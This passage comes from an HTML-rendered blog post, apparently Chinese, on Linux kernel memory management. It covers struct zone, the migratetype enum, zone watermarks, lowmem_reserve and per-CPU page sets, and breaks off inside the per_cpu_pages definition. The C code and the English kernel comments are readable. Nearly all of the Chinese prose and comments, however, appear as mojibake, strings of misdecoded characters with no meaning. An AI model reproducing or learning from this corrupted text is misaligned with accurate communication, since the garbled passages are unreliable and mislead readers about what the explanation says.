class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone çš„â€œæ°´ä½çº¿â€, ä½¿ç”¨å® *_wmark_pages(zone) è¿›è¡Œè®¿é—® */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> _watermark[NR_WMARK];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬å°†è¦åˆ†é…çš„å†…å­˜æ˜¯å¦æ˜¯å¯é‡Šæ”¾çš„ æˆ–/ä¸” æœ€ç»ˆä¼šè¢«é‡Šæ”¾ï¼Œ</span></span><br><span class="line"><span class="comment">     * å› æ­¤ä¸ºäº†é¿å…å°†æ•´ä¸ªçš„å‡ ä¸ª GB çš„ RAMæµªè´¹æ‰ï¼Œ</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬å¿…é¡»è¦ä¿ç•™ä¸€äº› lower zone memory</span></span><br><span class="line"><span class="comment">     * (å¦åˆ™æˆ‘ä»¬å°†æœ‰åœ¨ lower zones ä¸Šè€—å°½æ‰€æœ‰å†…å­˜ï¼ˆOOMï¼‰çš„é£é™©ï¼Œ</span></span><br><span class="line"><span class="comment">     * å°½ç®¡æ­¤æ—¶åœ¨ higher zones ä»æœ‰å¤§é‡çš„ RAM).</span></span><br><span class="line"><span class="comment">     * è‹¥ sysctl_lowmem_reserve_ratio ç³»ç»Ÿæ§åˆ¶é¡¹æ”¹å˜ï¼Œ</span></span><br><span class="line"><span class="comment">     * è¿™ä¸ªæ•°ç»„æœ‰å¯èƒ½åœ¨è¿è¡Œæ—¶è¢«æ”¹å˜</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>    *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment">     * faster access</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> pageset_high;</span><br><span class="line">    <span class="type">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å•ä¸ª pageblock_nr_pages block çš„æ ‡å¿—ä½. å‚è§ pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * åœ¨ SPARSEMEM ä¸­, è¯¥ map å­˜æ”¾äº struct mem_section ä¸­</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages ä¸ºè¯¥ zone æ‰€åŒ…å«çš„ pages çš„èŒƒå›´, åŒ…æ‹¬ç©ºæ´</span></span><br><span class="line"><span class="comment">     * è®¡ç®—æ–¹å¼å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">     *     spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages ä¸ºè¯¥ zone ä¸­å­˜åœ¨çš„ç‰©ç†é¡µæ¡†æ•°</span></span><br><span class="line"><span class="comment">     * è®¡ç®—æ–¹å¼å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">     *    present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages ä¸ºç°æœ‰çš„ç”± buddy system ç®¡ç†çš„é¡µé¢æ•°é‡, </span></span><br><span class="line"><span class="comment">     * è®¡ç®—æ–¹å¼å¦‚ä¸‹ (reserved_pages åŒ…æ‹¬ç”± bootmem allocator åˆ†é…çš„é¡µé¢):</span></span><br><span class="line"><span class="comment">     *    managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages å¯èƒ½ä¼šè¢«å†…å­˜çƒ­æ‹”æ’æˆ–å†…å­˜ç”µæºç®¡ç†é€»è¾‘</span></span><br><span class="line"><span class="comment">     * é€šè¿‡æ£€æŸ¥(present_pages - managed_pages)æ¥ç®—å‡ºæœªè¢«ç®¡ç†çš„é¡µé¢. </span></span><br><span class="line"><span class="comment">     * managed_pages åº”è¢«é¡µé¢åˆ†é…å™¨ä¸ vm æ‰«æå™¨ç”¨ä»¥è®¡ç®—æ‰€æœ‰çš„æ°´ä½çº¿ä¸é˜ˆå€¼</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * é”è§„åˆ™:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn ä¸ spanned_pages ç”± span_seqlock ä¿æŠ¤.</span></span><br><span class="line"><span class="comment">     * è¿™æ˜¯ä¸€ä¸ªé¡ºåºé”ï¼ˆseqlockï¼Œè¯‘è€…è¡¥å……ï¼šå†™ä¼˜å…ˆé”ï¼‰å› ä¸ºä»–å¾—åœ¨ zone-&gt;lock ä¹‹å¤–è¢«è¯»å–,</span></span><br><span class="line"><span class="comment">     * åœ¨ä¸»åˆ†é…å™¨è·¯å¾„ä¸­å®Œæˆ. </span></span><br><span class="line"><span class="comment">     * ä½†ä»–ç¡®å®ä¸ç»å¸¸è¢«å†™å…¥ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * span_seq lock éšç€ zone-&gt;lock è¢«å®šä¹‰ï¼Œå› ä¸ºç›¸è¾ƒäº zone-&gt;lockï¼Œ</span></span><br><span class="line"><span class="comment">     * ä»–ç»å¸¸è¢«è¯»å–. è®©ä»–ä»¬æœ‰ä¸ªæœºä¼šåœ¨åŒä¸€æ¡ç¼“å­˜çº¿ï¼ˆcachelineï¼‰ä¸Šä¸€ä»¶å¥½äº‹</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * è¿è¡Œæ—¶ present_pages åº”å½“ç”± mem_hotplug_begin/end() è¿›è¡Œä¿æŠ¤.</span></span><br><span class="line"><span class="comment">     * ä»»ä½•æ— æ³•å¿å— present_pages çš„åº”å½“ä½¿ç”¨ get_online_mems()æ¥è·å¾—å›ºå®šçš„å€¼.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        spanned_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        present_pages;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>        *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ç‹¬ç«‹çš„ pageblock çš„æ•°é‡. ç”¨ä»¥è§£å†³ç”±äºå¯¹ pagelock</span></span><br><span class="line"><span class="comment">     * çš„ migratetype çš„ç«æ€æ£€ç´¢å¯¼è‡´çš„å¯¹ freepage çš„é”™è¯¯è®¡æ•°.</span></span><br><span class="line"><span class="comment">     * ç”± zone-&gt;lock ä¿æŠ¤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* å‚è§ spanned/present_pages ä»¥è·å¾—æ›´å¤šæè¿° */</span></span><br><span class="line">    <span class="type">seqlock_t</span>        span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> initialized;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ä¾›é¡µåˆ†é…å™¨ä½¿ç”¨çš„å†™æ•æ„Ÿå­—æ®µ */</span></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ä¸åŒ sizes çš„é—²ç½®åŒºåŸŸ */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone æ ‡å¿—ä½ */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ä¸»è¦ä¿æŠ¤ free_area */</span></span><br><span class="line">    <span class="type">spinlock_t</span>        lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ä¾› compaction and vmstats ä½¿ç”¨çš„å†™æ•æ„Ÿå­—æ®µ. */</span></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å½“é—²ç½®é¡µåœ¨è¿™ä¸€ç‚¹ä¸‹æ—¶, åœ¨è¯»å–é—²ç½®é¡µæ•°é‡æ—¶ä¼šé‡‡å–é¢å¤–çš„æ­¥éª¤</span></span><br><span class="line"><span class="comment">     * ä»¥é¿å… per-cpu è®¡æ•°å™¨</span></span><br><span class="line"><span class="comment">     * æ¼‚ç§»å¯¼è‡´æ°´ä½çº¿è¢«çªç ´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_init_migrate_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>            compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone çš„ç»Ÿè®¡æ•°æ® */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><h2 id="I-é¡µé¢è¿ç§»æœºåˆ¶"><a href="#I-é¡µé¢è¿ç§»æœºåˆ¶" class="headerlink" title="I.é¡µé¢è¿ç§»æœºåˆ¶"></a>I.é¡µé¢è¿ç§»æœºåˆ¶</h2><p>é¡µé¢è¿ç§»ä¸»è¦ç”¨ä»¥è§£å†³å†…æ ¸ç©ºé—´ä¸­çš„<strong>ç¢ç‰‡é—®é¢˜</strong>ï¼Œåœ¨é•¿æœŸçš„è¿è¡Œä¹‹åå†…å­˜å½“ä¸­ç©ºé—²é¡µé¢çš„åˆ†å¸ƒå¯èƒ½æ˜¯é›¶æ•£çš„ï¼Œè¿™ä¾¿å¯¼è‡´äº†å†…æ ¸<strong>æœ‰å¯èƒ½æ— æ³•æ˜ å°„åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜</strong>ï¼Œå› æ­¤éœ€è¦è¿›è¡Œ_é¡µé¢è¿ç§»_â€”â€”å°†æ—§çš„é¡µé¢è¿ç§»åˆ°æ–°çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ä½†<strong>å¹¶éæ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯èƒ½å¤Ÿéšæ„è¿ç§»çš„</strong>ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ buddy system å½“ä¸­è¿˜éœ€è¦å°†é¡µé¢æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»</p><h3 id="è¿ç§»ç±»å‹"><a href="#è¿ç§»ç±»å‹" class="headerlink" title="è¿ç§»ç±»å‹"></a>è¿ç§»ç±»å‹</h3><p>è¿ç§»ç±»å‹ç”±ä¸€ä¸ªæšä¸¾ç±»å‹å®šä¹‰ï¼Œå®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">    MIGRATE_UNMOVABLE,</span><br><span class="line">    MIGRATE_MOVABLE,</span><br><span class="line">    MIGRATE_RECLAIMABLE,</span><br><span class="line">    MIGRATE_PCPTYPES,    <span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">     * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">     * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">     * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">     * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">     * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment">     * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment">     * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment">     * a single pageblock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    MIGRATE_ISOLATE,    <span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>ï¼šè¿™ç±»å‹é¡µé¢åœ¨å†…å­˜å½“ä¸­æœ‰ç€å›ºå®šçš„ä½ç½®ï¼Œ<strong>ä¸èƒ½ç§»åŠ¨</strong></li><li><strong>MIGRATE_MOVABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>å¯ä»¥éšæ„ç§»åŠ¨</strong>ï¼Œä¾‹å¦‚ç”¨æˆ·ç©ºé—´çš„é¡µé¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶æ•°æ®åæ”¹å˜é¡µè¡¨æ˜ å°„å³å¯</li><li><strong>MIGRATE_RECLAIMABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>ä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†æ˜¯å¯ä»¥åˆ é™¤</strong>ï¼Œä¾‹å¦‚æ˜ å°„è‡ªæ–‡ä»¶çš„é¡µ</li><li><strong>MIGRATE_PCPTYPES</strong>ï¼š<code>per_cpu_pageset</code>ï¼Œå³æ¯ CPU é¡µå¸§ç¼“å­˜ï¼Œå…¶è¿ç§»<strong>ä»…é™äºåŒä¸€èŠ‚ç‚¹å†…</strong></li><li><strong>MIGRATE_ISOLATE</strong>ï¼š<strong>ä¸èƒ½ä»è¯¥é“¾è¡¨åˆ†é…é¡µé¢</strong>ï¼Œè¯¥é“¾è¡¨ç”¨äºè·¨ NUMA èŠ‚ç‚¹è¿›è¡Œé¡µé¢ç§»åŠ¨ï¼Œå°†é¡µé¢ç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µé¢æœ€ä¸ºé¢‘ç¹çš„ CPU æ‰€å¤„èŠ‚ç‚¹</li><li><em>MIGRATE_TYPES_ï¼šè¡¨ç¤ºè¿ç§»ç±»å‹çš„æ•°ç›®ï¼Œ_å¹¶ä¸å­˜åœ¨è¿™ä¸€é“¾è¡¨</em></li></ul><h2 id="II-å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"><a href="#II-å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ" class="headerlink" title="II.å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"></a>II.å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ</h2><p>ç®€å•è®²è®²å…¶ä¸­å‡ ä¸ªé‡è¦çš„æˆå‘˜</p><h3 id="watermarkï¼šâ€œæ°´ä½çº¿â€"><a href="#watermarkï¼šâ€œæ°´ä½çº¿â€" class="headerlink" title="_watermarkï¼šâ€œæ°´ä½çº¿â€"></a>_watermarkï¼šâ€œæ°´ä½çº¿â€</h3><p>æ¯ä¸€ä¸ª zone éƒ½æœ‰ç€å…¶å¯¹åº”çš„ä¸‰æ¡£â€œæ°´ä½çº¿â€ï¼š <code>WMARK_MIN</code>ã€<code>WMARK_LOW</code>ã€<code>WMARK_HIGH</code>ï¼Œå­˜æ”¾åœ¨ _watermark æ•°ç»„ä¸­ï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œåˆ†é…å™¨ï¼ˆä¾‹å¦‚ buddy systemï¼‰ä¼šæ ¹æ®å½“å‰ zone ä¸­ç©ºä½™å†…å­˜æ‰€å¤„åœ¨çš„â€œæ°´ä½çº¿â€æ¥åˆ¤æ–­å½“å‰çš„å†…å­˜çŠ¶å†µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><blockquote><p>å›¾ä»ç„¶æ˜¯å·çš„ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/25/8OuZhEfjHIy9AeL.png" alt="image.png"></p><blockquote><p>å…·ä½“æœºåˆ¶å¯ä»¥å‚è§<a href="https://zhuanlan.zhihu.com/p/73539328">è¿™é‡Œ</a></p></blockquote><h3 id="lowmem-reserveï¼šzone-è‡ªèº«çš„ä¿ç•™å†…å­˜"><a href="#lowmem-reserveï¼šzone-è‡ªèº«çš„ä¿ç•™å†…å­˜" class="headerlink" title="lowmem_reserveï¼šzone è‡ªèº«çš„ä¿ç•™å†…å­˜"></a>lowmem_reserveï¼šzone è‡ªèº«çš„ä¿ç•™å†…å­˜</h3><p>åœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œè‹¥å½“å‰çš„ zone æ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜äº†ï¼Œåˆ™ä¼šå‘ä¸‹ä¸€ä¸ª zone ç´¢è¦å†…å­˜ï¼Œé‚£ä¹ˆè¿™å°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šæ¥è‡ª higher zones çš„å†…å­˜åˆ†é…è¯·æ±‚å¯èƒ½è€—å°½ lower zones çš„å†…å­˜ï¼Œä½†è¿™æ ·åˆ†é…çš„å†…å­˜æœªå¿…æ˜¯å¯é‡Šæ”¾çš„ï¼ˆfreeableï¼‰ï¼Œäº¦æˆ–è€…&#x2F;ä¸”æœ€ç»ˆä¸ä¸€å®šä¼šè¢«é‡Šæ”¾ï¼Œè¿™æœ‰å¯èƒ½å¯¼è‡´ <strong>lower zones çš„å†…å­˜æå‰è€—å°½ï¼Œè€Œ higher zones å´ä»ä¿ç•™æœ‰å¤§é‡çš„å†…å­˜</strong></p><p>ä¸ºäº†é¿å…è¿™æ ·çš„ä¸€ç§æƒ…å†µçš„å‘ç”Ÿï¼Œ<code>lowmem_reserve</code> å­—æ®µç”¨ä»¥å£°æ˜<strong>ä¸ºè¯¥ zone ä¿ç•™çš„å†…å­˜</strong>ï¼Œè¿™ä¸€å—å†…å­˜åˆ«çš„ zone æ˜¯ä¸èƒ½åŠ¨çš„</p><h3 id="nodeï¼šNUMA-ä¸­æ ‡è¯†æ‰€å±-node"><a href="#nodeï¼šNUMA-ä¸­æ ‡è¯†æ‰€å±-node" class="headerlink" title="nodeï¼šNUMA ä¸­æ ‡è¯†æ‰€å± node"></a><em>nodeï¼šNUMA ä¸­æ ‡è¯†æ‰€å± node</em></h3><p>è¿™ä¸ªå­—æ®µåªåœ¨ NUMA ç³»ç»Ÿä¸­è¢«å¯ç”¨ï¼Œç”¨ä»¥æ ‡è¯†è¯¥ zone æ‰€å±çš„ node</p><p>å¯ä»¥å‚è€ƒä¸‹é¢çš„å›¾</p><blockquote><p>å›¾è¿˜æ˜¯å·çš„ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/25/LlaVq9eREW5sJAH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/25/uwbo53W2Mjh1gOm.png" alt="image.png"></p><h3 id="zone-pgdatï¼šzone-æ‰€å±çš„-pglist-data-èŠ‚ç‚¹"><a href="#zone-pgdatï¼šzone-æ‰€å±çš„-pglist-data-èŠ‚ç‚¹" class="headerlink" title="zone_pgdatï¼šzone æ‰€å±çš„ pglist_data èŠ‚ç‚¹"></a>zone_pgdatï¼šzone æ‰€å±çš„ pglist_data èŠ‚ç‚¹</h3><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯†è¯¥ zone æ‰€å±çš„ pglist_data èŠ‚ç‚¹</p><h3 id="pageset-ï¼šzone-ä¸ºæ¯ä¸ª-CPU-åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ"><a href="#pageset-ï¼šzone-ä¸ºæ¯ä¸ª-CPU-åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ" class="headerlink" title="**pageset**ï¼šzone ä¸ºæ¯ä¸ª CPU åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ"></a>**pageset**ï¼šzone ä¸ºæ¯ä¸ª CPU åˆ’åˆ†ä¸€ä¸ªç‹¬ç«‹çš„â€é¡µé¢ä»“åº“â€œ</h3><p>ä¼—æ‰€å‘¨çŸ¥ä¼´éšç€å¤š CPU çš„å¼•å…¥ï¼Œ<strong>æ¡ä»¶ç«äº‰</strong>å°±æ˜¯ä¸€ä¸ªä¸å¯å¿½è§†çš„é—®é¢˜ï¼Œå½“å¤šä¸ª CPU éœ€è¦å¯¹ä¸€ä¸ª zone è¿›è¡Œæ“ä½œæ—¶ï¼Œé¢‘ç¹çš„åŠ é”&#x2F;è§£é”æ“ä½œåˆ™æ¯«æ— ç–‘é—®ä¼šé€ æˆå¤§é‡çš„å¼€é”€ï¼Œå› æ­¤ zone å¼•å…¥äº† <code>per_cpu_pageset</code> ç»“æ„ä½“æˆå‘˜ï¼Œå³<strong>ä¸ºæ¯ä¸€ä¸ª CPU éƒ½å‡†å¤‡ä¸€ä¸ªå•ç‹¬çš„é¡µé¢ä»“åº“</strong>ï¼Œå› æ­¤å…¶å®ç°æ–¹å¼æ˜¯å®ç°ä¸ºä¸€ä¸ª <code>percpu</code> å˜é‡</p><p>åœ¨ä¸€å¼€å§‹æ—¶ buddy system ä¼šå°†é¡µé¢æ”¾ç½®åˆ°å„ä¸ª CPU è‡ªå·±ç‹¬ç«‹çš„é¡µé¢ä»“åº“ä¸­ï¼Œéœ€è¦è¿›è¡Œåˆ†é…æ—¶ CPU ä¼˜å…ˆä»è‡ªå·±çš„é¡µé¢ä»“åº“ä¸­åˆ†é…</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> count;        <span class="comment">/* é“¾è¡¨ä¸­é¡µçš„æ•°é‡ */</span></span><br><span class="line">    <span class="type">int</span> high;        <span class="comment">/* é«˜æ°´ä½çº¿, æ¸…ç©ºéœ€è¦ï¼ˆç¬”è€…è¡¥ï¼šç”¨ä»¥è¿›è¡Œåˆ¤æ–­ï¼‰ */</span></span><br><span class="line">    <span class="type">int</span> batch;        <span 